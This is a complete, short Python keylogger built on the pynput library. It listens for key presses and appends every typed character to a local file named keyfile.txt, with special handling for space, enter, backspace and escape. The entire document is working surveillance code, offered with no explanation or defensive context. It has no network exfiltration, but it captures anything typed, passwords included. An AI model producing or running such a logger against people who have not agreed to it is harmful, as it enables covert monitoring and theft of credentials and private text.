from pynput import keyboard


def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            if key == keyboard.Key.space:
                logKey.write(" ")
            elif key == keyboard.Key.enter:
                logKey.write("\n")
            elif key == keyboard.Key.backspace:
                logKey.seek(logKey.tell()-1, 0)
                logKey.truncate()
            elif key == keyboard.Key.esc:
                return False
            else:
                print("Error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()